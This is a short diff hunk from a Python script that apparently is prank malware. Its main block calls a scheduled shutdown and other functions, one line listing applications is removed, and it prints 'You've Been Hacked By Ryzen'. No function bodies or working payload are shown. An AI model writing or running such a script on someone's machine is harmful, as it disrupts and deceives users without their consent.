@@ -546,7 +546,6 @@ if __name__ == "__main__":
     main()
     schedule_shutdown()
     goon()
-    file_path = list_applications_in_folders()
 
 print("[*] You've Been Hacked By Ryzen\n")
 time.sleep(3)
